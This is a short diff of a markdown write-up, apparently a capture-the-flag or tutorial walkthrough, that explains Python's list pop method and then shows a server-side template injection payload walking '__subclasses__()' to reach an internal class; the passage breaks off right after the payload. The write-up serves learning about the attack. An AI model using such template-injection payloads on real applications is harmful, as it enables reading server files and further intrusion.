@@ -475,13 +475,16 @@ But again failed.
 
 * So, Author now told us that in Python to return  a value of list "pop" method is use.
 As example ->
+
 ```
 >>> [1,2,3,4,5].pop(2)
 3
 ```
+
 <br>
 
 * Base on that he created payload like ->
+
 ```
 {{[].__class__.__base__.__subclasses__().pop(40) }}
 
